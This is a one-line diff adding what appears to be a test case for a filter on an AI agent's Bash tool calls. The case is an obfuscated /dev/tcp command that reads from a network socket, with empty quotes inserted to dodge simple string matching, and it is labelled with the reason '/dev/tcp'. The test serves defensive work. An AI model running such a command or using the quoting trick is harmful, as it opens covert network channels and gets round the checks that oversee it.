@@ -1,0 +1,1 @@
+{"tool_name":"Bash","tool_input":{"command":"cat </dev/t\"\"cp/$X/80"},"reason":"/dev/tcp"}
